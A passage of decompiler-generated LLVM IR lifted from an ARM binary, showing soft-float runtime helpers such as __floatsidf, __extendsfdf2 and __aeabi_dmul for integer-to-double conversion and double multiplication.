  uselistorder i32 128, { 12, 13, 22, 0, 6, 7, 10, 5, 8, 23, 24, 1, 21, 9, 17, 18, 2, 3, 11, 19, 20, 4, 15, 14, 16 }
  uselistorder i32 255, { 6, 7, 10, 1, 9, 0, 8, 2, 3, 4, 5 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 2, 3, 1, 4, 0 }
  uselistorder i32 52, { 0, 5, 6, 3, 7, 4, 1, 2 }
  uselistorder i32 20, { 3, 30, 31, 7, 32, 33, 34, 35, 0, 23, 36, 5, 37, 1, 6, 28, 29, 13, 21, 14, 8, 2, 9, 24, 25, 26, 27, 15, 16, 17, 18, 19, 20, 4, 10, 11, 12, 22 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1a810, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a880(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1a880:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1a880 = load i32, i32* @r4, align 4
  %v2_1a880 = icmp eq i32 %v0_1a880, 0
  %v1_1a884 = xor i32 %arg3, 1048576
  store i32 %v1_1a884, i32* @r2, align 4
  br i1 %v2_1a880, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1a880
  %v2_1a888 = xor i32 %arg1, 1048576
  store i32 %v2_1a888, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a880
  %v1_1a890 = load i32, i32* @r5, align 4
  %v2_1a890 = add i32 %v1_1a890, -1
  store i32 %v2_1a890, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a894 = call i32 @function_1a6ec()
  %v0_1a898 = load i32, i32* @r4, align 4
  %v0_1a898.off = add i32 %v0_1a898, 4194303
  %tmp = icmp ult i32 %v0_1a898.off, 2097152
  %v1_1a914 = load i32, i32* @r5, align 4
  %v1_1a914.off = add i32 %v1_1a914, 4194303
  %tmp45 = icmp ult i32 %v1_1a914.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_1a8a4

dec_label_pc_1a8a4:                               ; preds = %bb33
  %v4_1a8a4 = icmp eq i32 %v1_1a914, %v0_1a898
  %v1_1a8a8 = load i32, i32* @r1, align 4
  br i1 %v4_1a8a4, label %bb34, label %dec_label_pc_1a8b0

bb34:                                             ; preds = %dec_label_pc_1a8a4
  %v2_1a8a8 = load i32, i32* @r3, align 4
  %v5_1a8a8 = icmp eq i32 %v2_1a8a8, %v1_1a8a8
  br i1 %v5_1a8a8, label %dec_label_pc_1a8c0, label %dec_label_pc_1a8b0

dec_label_pc_1a8b0:                               ; preds = %dec_label_pc_1a8a4, %bb34
  %v2_1a8b0 = or i32 %v1_1a8a8, %v0_1a898
  %v4_1a8b0 = icmp eq i32 %v2_1a8b0, 0
  br i1 %v4_1a8b0, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_1a8b0
  %v1_1a8b4 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a8b0, %bb35
  %v11_1a8bc = phi i32 [ %v0_1a894, %dec_label_pc_1a8b0 ], [ %v1_1a8b4, %bb35 ]
  ret i32 %v11_1a8bc

dec_label_pc_1a8c0:                               ; preds = %bb34
  %v1_1a8c0 = load i32, i32* @r2, align 4
  %v4_1a8c0 = icmp eq i32 %v1_1a8c0, %v0_1a894
  br i1 %v4_1a8c0, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_1a8c0
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_1a8c0
  %tmp46 = icmp ult i32 %v0_1a898, 2097152
  br i1 %tmp46, label %dec_label_pc_1a8d8, label %dec_label_pc_1a8e8

dec_label_pc_1a8d8:                               ; preds = %.thread8
  %v1_1a8d8 = icmp slt i32 %v1_1a8a8, 0
  %v3_1a8dc = mul i32 %v0_1a894, 2
  %v4_1a8dc = zext i1 %v1_1a8d8 to i32
  %v5_1a8dc = or i32 %v4_1a8dc, %v3_1a8dc
  %v9_1a8dc = icmp ule i32 %v5_1a8dc, %v0_1a894
  %v10_1a8dc = icmp ult i32 %v3_1a8dc, %v0_1a894
  %v11_1a8dc = select i1 %v1_1a8d8, i1 %v9_1a8dc, i1 %v10_1a8dc
  br i1 %v11_1a8dc, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_1a8d8
  %v2_1a8e0 = or i32 %v5_1a8dc, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_1a8d8, %bb37
  %v11_1a8e4 = phi i32 [ %v5_1a8dc, %dec_label_pc_1a8d8 ], [ %v2_1a8e0, %bb37 ]
  ret i32 %v11_1a8e4

dec_label_pc_1a8e8:                               ; preds = %.thread8
  %v2_1a8e8 = icmp ugt i32 %v0_1a898, -4194305
  br i1 %v2_1a8e8, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_1a8e8
  %v2_1a8ec = add i32 %v0_1a894, 1048576
  ret i32 %v2_1a8ec

.thread9:                                         ; preds = %dec_label_pc_1a8e8
  %v1_1a8f4 = and i32 %v0_1a894, -2147483648
  %v1_1a8fc = or i32 %v1_1a8f4, 2146435072
  ret i32 %v1_1a8fc

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_1a920.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_1a894, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_1a90c = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1a92027 = phi i32 [ %v0_1a894, %.thread14 ], [ %v1_1a90c, %bb40 ]
  %v1_1a91c.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_1a91c = load i32, i32* %v1_1a91c.in, align 4
  store i32 %v1_1a91c, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_1a92c = phi i32 [ %v0_1a894, %.thread11..thread13_crit_edge ], [ %v1_1a92027, %bb41 ]
  %v0_1a920 = phi i32 [ %v0_1a920.pre, %.thread11..thread13_crit_edge ], [ %v1_1a91c, %bb41 ]
  %v4_1a920 = mul i32 %v1_1a92c, 4096
  %v5_1a920 = or i32 %v4_1a920, %v0_1a920
  %v7_1a920 = icmp eq i32 %v5_1a920, 0
  br i1 %v7_1a920, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_1a924 = load i32, i32* @r3, align 4
  %v2_1a924 = load i32, i32* @r2, align 4
  %v5_1a924 = mul i32 %v2_1a924, 4096
  %v6_1a924 = or i32 %v5_1a924, %v1_1a924
  %v8_1a924 = icmp eq i32 %v6_1a924, 0
  br i1 %v8_1a924, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_1a928 = icmp eq i32 %v2_1a924, %v1_1a92c
  br i1 %v5_1a928, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_1a92c = or i32 %v1_1a92c, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_1a930 = phi i32 [ %v1_1a92c, %bb43 ], [ %v2_1a92c, %.thread17 ]
  ret i32 %v11_1a930

; uselistorder directives
  uselistorder i32 %v1_1a92c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1a91c, { 1, 0 }
  uselistorder i1 %v1_1a8d8, { 1, 0 }
  uselistorder i32 %v1_1a8a8, { 2, 1, 0 }
  uselistorder i32 %v0_1a898, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1a894, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1a8b0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1a934 = icmp eq i32 %arg1, 0
  br i1 %v2_1a934, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_1a958 = call i32 @function_1a79c(i32 0)
  ret i32 %v1_1a958
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1a95c = icmp eq i32 %arg1, 0
  br i1 %v2_1a95c, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_1a974 = and i32 %arg1, -2147483648
  store i32 %v1_1a974, i32* @r5, align 4
  %v2_1a974 = icmp eq i32 %v1_1a974, 0
  br i1 %v2_1a974, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_1a978 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_1a97c = phi i32 [ %arg1, %.thread ], [ %v2_1a978, %bb4 ]
  store i32 %v0_1a97c, i32* @r1, align 4
  %v1_1a984 = call i32 @function_1a79c(i32 0)
  ret i32 %v1_1a984

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1a988 = mul i32 %arg1, 2
  %v4_1a988 = icmp eq i32 %v2_1a988, 0
  %v1_1a98c = and i32 %v2_1a988, 4
  %v2_1a98c = icmp ne i32 %v1_1a98c, 0
  %v3_1a98c = sdiv i32 %v2_1a988, 8
  %v3_1a990 = zext i1 %v2_1a98c to i32
  %v6_1a990 = zext i32 %v3_1a98c to i64
  %v7_1a990 = sub nsw i32 33, %v3_1a98c
  %v8_1a990 = zext i32 %v7_1a990 to i64
  %v9_1a990 = shl i64 %v6_1a990, %v8_1a990
  %v10_1a990 = sub nsw i32 32, %v3_1a98c
  %v11_1a990 = shl i32 %v3_1a990, %v10_1a990
  %v12_1a990 = zext i32 %v11_1a990 to i64
  %v14_1a990 = or i64 %v12_1a990, %v9_1a990
  %v15_1a990 = trunc i64 %v14_1a990 to i32
  %v3_1a994 = mul i32 %arg1, 536870912
  store i32 %v3_1a994, i32* @r1, align 4
  br i1 %v4_1a988, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_1a998 = icmp ult i32 %v2_1a988, 16777216
  br i1 %v4_1a998, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_1a9ac18 = icmp ugt i32 %v2_1a988, -16777217
  br i1 %v4_1a9ac18, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_1a9a06 = xor i32 %v15_1a990, 939524096
  ret i32 %v2_1a9a06

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_1a990

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_1a9bc = and i32 %v15_1a990, -2147483648
  store i32 %v1_1a9bc, i32* @r5, align 4
  %tmp = bitcast i32 %v15_1a990 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1a9c0 = bitcast float %tmp19 to i32
  %v1_1a9c4 = call i32 @function_1a79c(i32 %v1_1a9c0)
  ret i32 %v1_1a9c4

; uselistorder directives
  uselistorder i32 %v15_1a990, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1a98c, { 1, 2, 0 }
  uselistorder i32 %v2_1a988, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_1a79c, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1a9c8 = or i32 %arg2, %arg1
  %v4_1a9c8 = icmp eq i32 %v2_1a9c8, 0
  br i1 %v4_1a9c8, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_1a9d8 = call i32 @function_1a9f8()
  ret i32 %v0_1a9d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a9dc = or i32 %arg2, %arg1
  %v4_1a9dc = icmp eq i32 %v2_1a9dc, 0
  br i1 %v4_1a9dc, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_1a9ec = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1a9ec, i32 ptrtoint (i32* @global_var_1a9f8.1398 to i32))
  %v1_1a9f0 = sub i32 0, %arg1
  ret i32 %v1_1a9f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_1a9f8() local_unnamed_addr {
dec_label_pc_1a9f8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1aa00 = load i32, i32* @r0, align 4
  %v0_1aa04 = load i32, i32* @r1, align 4
  store i32 %v0_1aa04, i32* %r0.global-to-local, align 4
  store i32 %v0_1aa00, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1aa04, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1a740.1396 to i32))
  %tmp6 = icmp ult i32 %v0_1aa04, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1a9f8
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1a9f8, %bb
  %v1_1aa24 = phi i32 [ 3, %dec_label_pc_1a9f8 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1aa04, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1aa24 = add nuw nsw i32 %v1_1aa24, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1aa28 = phi i32 [ %v1_1aa24, %bb3 ], [ %v2_1aa24, %bb4 ]
  %not. = icmp slt i32 %v0_1aa04, 0
  %v4_1aa28 = zext i1 %not. to i32
  %v5_1aa28 = add nsw i32 %v0_1aa28, %v4_1aa28
  %v1_1aa2c = sub nsw i32 32, %v5_1aa28
  %v0_1aa30 = load i32, i32* %r1.global-to-local, align 4
  %v6_1aa30 = shl i32 %v0_1aa30, %v1_1aa2c
  store i32 %v6_1aa30, i32* @ip, align 4
  %v6_1aa34 = lshr i32 %v0_1aa30, %v5_1aa28
  %v1_1aa38 = load i32, i32* %r0.global-to-local, align 4
  %v7_1aa38 = shl i32 %v1_1aa38, %v1_1aa2c
  %v8_1aa38 = or i32 %v7_1aa38, %v6_1aa34
  store i32 %v8_1aa38, i32* %r1.global-to-local, align 4
  %v6_1aa3c = lshr i32 %v1_1aa38, %v5_1aa28
  store i32 %v6_1aa3c, i32* %r0.global-to-local, align 4
  %v0_1aa40 = load i32, i32* %r4.global-to-local, align 4
  %v2_1aa40 = add i32 %v0_1aa40, %v5_1aa28
  store i32 %v2_1aa40, i32* @r4, align 4
  %v4_1aa44 = sext i32 %v8_1aa38 to i64
  %v5_1aa44 = call i32 @function_1a740(i32 %v6_1aa3c, i64 %v4_1aa44, i32 %v5_1aa28, i32 %v1_1aa2c)
  store i32 %v5_1aa44, i32* %r0.global-to-local, align 4
  ret i32 %v5_1aa44

; uselistorder directives
  uselistorder i32 %v5_1aa28, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 6, { 1, 26, 27, 28, 17, 18, 2, 23, 24, 3, 4, 29, 5, 6, 25, 0, 7, 8, 9, 10, 19, 20, 13, 14, 15, 16, 12, 21, 22, 11 }
  uselistorder i32 3, { 62, 17, 47, 72, 48, 26, 27, 79, 21, 80, 81, 22, 82, 83, 13, 73, 0, 29, 28, 49, 3, 2, 1, 4, 84, 30, 5, 6, 14, 7, 8, 50, 51, 88, 52, 53, 54, 55, 56, 57, 74, 11, 31, 75, 32, 65, 33, 66, 34, 67, 35, 68, 36, 69, 12, 63, 89, 18, 85, 86, 23, 78, 15, 87, 16, 76, 9, 10, 58, 24, 59, 25, 77, 60, 20, 37, 64, 38, 61, 40, 39, 46, 70, 71, 41, 42, 43, 44, 45, 19 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1aa48 = load i32, i32* @r4, align 4
  store i32 %v3_1aa48, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1aa54 = udiv i32 %arg1, 1048576
  %v5_1aa54 = urem i32 %v4_1aa54, 2048
  store i32 %v5_1aa54, i32* %r4.global-to-local, align 4
  %v6_1aa54 = icmp eq i32 %v5_1aa54, 0
  br i1 %v6_1aa54, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_1aa58 = udiv i32 %arg3, 1048576
  %v6_1aa58 = urem i32 %v5_1aa58, 2048
  store i32 %v6_1aa58, i32* @r5, align 4
  %v7_1aa58 = icmp eq i32 %v6_1aa58, 0
  br i1 %v7_1aa58, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_1aa5c = icmp eq i32 %v5_1aa54, 2047
  br i1 %v5_1aa5c, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_1aa60 = icmp eq i32 %v6_1aa58, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_1aa64 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_1aa60, %bb42 ], [ true, %entry ]
  store i32 109160, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1aa64, i32 ptrtoint (i32* @global_var_1ace4.1399 to i32))
  %v0_1aa68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1aa68 = load i32, i32* @r5, align 4
  %v2_1aa68 = add i32 %v1_1aa68, %v0_1aa68
  store i32 %v2_1aa68, i32* %r4.global-to-local, align 4
  %v2_1aa6c = xor i32 %arg3, %arg1
  %v1_1aa70 = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_1aa70, -2097152
  %v5_1aa70 = add i32 %tmp, -1
  %v6_1aa70 = and i32 %v5_1aa70, %arg1
  store i32 %v6_1aa70, i32* %r0.global-to-local, align 4
  %v6_1aa74 = and i32 %v5_1aa70, %arg3
  store i32 %v6_1aa74, i32* %r2.global-to-local, align 4
  %v4_1aa78 = mul i32 %arg1, 4096
  %v5_1aa78 = or i32 %v4_1aa78, %arg2
  %v7_1aa78 = icmp eq i32 %v5_1aa78, 0
  br i1 %v7_1aa78, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_1aa8017 = or i32 %v6_1aa70, 1048576
  store i32 %v1_1aa8017, i32* %r0.global-to-local, align 4
  %v1_1aa8418 = or i32 %v6_1aa74, 1048576
  store i32 %v1_1aa8418, i32* %r2.global-to-local, align 4
  %v1_1abbc19 = and i32 %v2_1aa6c, -2147483648
  br label %dec_label_pc_1abbc

bb43:                                             ; preds = %.thread1
  %v5_1aa7c = mul i32 %arg3, 4096
  %v6_1aa7c = or i32 %v5_1aa7c, %arg4
  %v8_1aa7c = icmp eq i32 %v6_1aa7c, 0
  %v1_1aa80 = or i32 %v6_1aa70, 1048576
  store i32 %v1_1aa80, i32* %r0.global-to-local, align 4
  %v1_1aa84 = or i32 %v6_1aa74, 1048576
  store i32 %v1_1aa84, i32* %r2.global-to-local, align 4
  %v1_1abbc = and i32 %v2_1aa6c, -2147483648
  br i1 %v8_1aa7c, label %dec_label_pc_1abbc, label %dec_label_pc_1aa8c

dec_label_pc_1aa8c:                               ; preds = %bb43
  store i32 %v1_1abbc, i32* %stack_var_-40, align 4
  %v9_1aa90 = load i32, i32* @r8, align 4
  %v12_1aa90 = load i32, i32* @sb, align 4
  %v3_1aa94 = udiv i32 %arg2, 65536
  %v3_1aa98 = udiv i32 %arg4, 65536
  store i32 %v3_1aa98, i32* %r8.global-to-local, align 4
  %v3_1aa9c = udiv i32 %v1_1aa80, 65536
  store i32 %v3_1aa9c, i32* %sb.global-to-local, align 4
  %v3_1aaa0 = udiv i32 %v1_1aa84, 65536
  %tmp59 = mul i32 %v3_1aa94, -65536
  %v5_1aaa4 = add i32 %tmp59, -1
  %v6_1aaa4 = and i32 %v5_1aaa4, %arg2
  store i32 %v6_1aaa4, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_1aa98, -65536
  %v5_1aaa8 = add i32 %tmp60, -1
  %v6_1aaa8 = and i32 %v5_1aaa8, %arg4
  %tmp61 = mul i32 %v3_1aa9c, -65536
  %v5_1aaac = add i32 %tmp61, -1
  %v6_1aaac = and i32 %v6_1aa70, %v5_1aaac
  store i32 %v6_1aaac, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_1aaa0, -65536
  %v5_1aab0 = add i32 %tmp62, -1
  %v6_1aab0 = and i32 %v6_1aa74, %v5_1aab0
  store i32 %v6_1aab0, i32* %r2.global-to-local, align 4
  %v2_1aab4 = mul i32 %v6_1aaa8, %v6_1aaa4
  %v2_1aab8 = mul i32 %v3_1aa98, %v6_1aaa4
  %v2_1aac4 = and i32 %v2_1aab8, 32768
  %v3_1aac4 = icmp ne i32 %v2_1aac4, 0
  %v4_1aac4 = udiv i32 %v2_1aab8, 65536
  %v7_1aac4 = zext i1 %v3_1aac4 to i32
  %v2_1aac8 = mul i32 %v6_1aaa8, %v3_1aa94
  %tmp53 = add i32 %v2_1aac8, %v2_1aab8
  %tmp54 = mul i32 %tmp53, 65536
  %v5_1aacc = add i32 %tmp54, %v2_1aab4
  store i32 %v5_1aacc, i32* %ip.global-to-local, align 4
  %v2_1aad0 = and i32 %v2_1aac8, 32768
  %v3_1aad0 = icmp ne i32 %v2_1aad0, 0
  %v4_1aad0 = udiv i32 %v2_1aac8, 65536
  %v7_1aad0 = zext i1 %v3_1aad0 to i32
  %v2_1aad4 = mul i32 %v3_1aaa0, %v6_1aaa4
  %v2_1aae0 = and i32 %v2_1aad4, 32768
  %v3_1aae0 = icmp ne i32 %v2_1aae0, 0
  %v4_1aae0 = udiv i32 %v2_1aad4, 65536
  %v7_1aae0 = zext i1 %v3_1aae0 to i32
  %v8_1aae0 = add nuw nsw i32 %v7_1aae0, %v4_1aae0
  %v2_1aae4 = mul i32 %v6_1aab0, %v3_1aa94
  %v2_1aaec = and i32 %v2_1aae4, 32768
  %v3_1aaec = icmp ne i32 %v2_1aaec, 0
  %v4_1aaec = udiv i32 %v2_1aae4, 65536
  %v6_1aaec = add nuw nsw i32 %v8_1aae0, %v4_1aaec
  %v7_1aaec = zext i1 %v3_1aaec to i32
  %v8_1aaec = add nuw nsw i32 %v6_1aaec, %v7_1aaec
  %v2_1aaf0 = mul i32 %v3_1aa98, %v6_1aaac
  %v2_1aaf8 = and i32 %v2_1aaf0, 32768
  %v3_1aaf8 = icmp ne i32 %v2_1aaf8, 0
  %v4_1aaf8 = udiv i32 %v2_1aaf0, 65536
  %v6_1aaf8 = add nuw nsw i32 %v8_1aaec, %v4_1aaf8
  %v7_1aaf8 = zext i1 %v3_1aaf8 to i32
  %v8_1aaf8 = add nuw nsw i32 %v6_1aaf8, %v7_1aaf8
  %v2_1aafc = mul i32 %v6_1aaa8, %v3_1aa9c
  %v4_1ab00 = mul i32 %v2_1aafc, 65536
  %tmp55 = add i32 %v2_1aae4, %v2_1aad4
  %tmp56 = add i32 %tmp55, %v2_1aaf0
  %tmp57 = mul i32 %tmp56, 65536
  %v8_1aad0 = add nuw nsw i32 %v7_1aac4, %v4_1aac4
  %v5_1aadc = add nuw nsw i32 %v8_1aad0, %v4_1aad0
  %v5_1aae8 = add nuw nsw i32 %v5_1aadc, %v7_1aad0
  %v5_1aaf4 = add i32 %v5_1aae8, %v4_1ab00
  %v5_1ab00 = add i32 %v5_1aaf4, %tmp57
  %v2_1ab04 = and i32 %v2_1aafc, 32768
  %v3_1ab04 = icmp ne i32 %v2_1ab04, 0
  %v4_1ab04 = udiv i32 %v2_1aafc, 65536
  %v6_1ab04 = add nuw nsw i32 %v8_1aaf8, %v4_1ab04
  %v7_1ab04 = zext i1 %v3_1ab04 to i32
  %v8_1ab04 = add i32 %v6_1ab04, %v7_1ab04
  %v2_1ab08 = mul i32 %v3_1aaa0, %v6_1aaac
  %v2_1ab0c = mul nuw i32 %v3_1aaa0, %v3_1aa9c
  %v4_1ab10 = mul i32 %v2_1ab08, 65536
  %v5_1ab10 = add i32 %v8_1ab04, %v4_1ab10
  %v2_1ab14 = and i32 %v2_1ab08, 32768
  %v3_1ab14 = icmp ne i32 %v2_1ab14, 0
  %v4_1ab14 = udiv i32 %v2_1ab08, 65536
  %v6_1ab14 = add i32 %v4_1ab14, %v2_1ab0c
  %v7_1ab14 = zext i1 %v3_1ab14 to i32
  %v2_1ab18 = mul i32 %v6_1aab0, %v3_1aa9c
  %v4_1ab1c = mul i32 %v2_1ab18, 65536
  %v5_1ab1c = add i32 %v5_1ab10, %v4_1ab1c
  %v2_1ab20 = and i32 %v2_1ab18, 32768
  %v3_1ab20 = icmp ne i32 %v2_1ab20, 0
  %v4_1ab20 = udiv i32 %v2_1ab18, 65536
  %v7_1ab20 = zext i1 %v3_1ab20 to i32
  %v2_1ab24 = mul i32 %v6_1aaa4, %v6_1aab0
  %v2_1ab28 = add i32 %v2_1ab24, %v5_1ab00
  %v3_1ab28 = icmp ult i32 %v2_1ab28, %v5_1ab00
  %v2_1ab2c = mul nuw i32 %v3_1aa94, %v3_1aaa0
  %v3_1ab30 = add i32 %v5_1ab1c, %v2_1ab2c
  %v4_1ab30 = zext i1 %v3_1ab28 to i32
  %v5_1ab30 = add i32 %v4_1ab30, %v3_1ab30
  %v9_1ab30 = icmp ule i32 %v5_1ab30, %v5_1ab1c
  %v10_1ab30 = icmp ult i32 %v3_1ab30, %v5_1ab1c
  %v11_1ab30 = select i1 %v3_1ab28, i1 %v9_1ab30, i1 %v10_1ab30
  %v2_1ab34 = mul i32 %v6_1aaa8, %v6_1aaac
  %v2_1ab38 = zext i1 %v11_1ab30 to i32
  %v2_1ab3c = add i32 %v2_1ab34, %v2_1ab28
  %v3_1ab3c = icmp ult i32 %v2_1ab3c, %v2_1ab28
  %v0_1ab40 = load i32, i32* %sb.global-to-local, align 4
  %v1_1ab40 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ab40 = mul i32 %v1_1ab40, %v0_1ab40
  %v3_1ab44 = add i32 %v2_1ab40, %v5_1ab30
  %v4_1ab44 = zext i1 %v3_1ab3c to i32
  %v5_1ab44 = add i32 %v4_1ab44, %v3_1ab44
  %v9_1ab44 = icmp ule i32 %v5_1ab44, %v5_1ab30
  %v10_1ab44 = icmp ult i32 %v3_1ab44, %v5_1ab30
  %v11_1ab44 = select i1 %v3_1ab3c, i1 %v9_1ab44, i1 %v10_1ab44
  %v2_1ab48 = mul i32 %v1_1ab40, %v3_1aa94
  %v2_1ab4c = zext i1 %v11_1ab44 to i32
  %v8_1ab14 = add i32 %v6_1ab14, %v4_1ab20
  %v6_1ab20 = add i32 %v8_1ab14, %v7_1ab14
  %v8_1ab20 = add i32 %v6_1ab20, %v7_1ab20
  %v3_1ab38 = add i32 %v8_1ab20, %v2_1ab38
  %v3_1ab4c = add i32 %v3_1ab38, %v2_1ab4c
  %v2_1ab50 = add i32 %v2_1ab48, %v2_1ab3c
  store i32 %v2_1ab50, i32* %lr.global-to-local, align 4
  %v3_1ab50 = icmp ult i32 %v2_1ab50, %v2_1ab3c
  %v1_1ab54 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ab54 = mul i32 %v1_1ab54, %v6_1aaac
  %v3_1ab58 = add i32 %v5_1ab44, %v2_1ab54
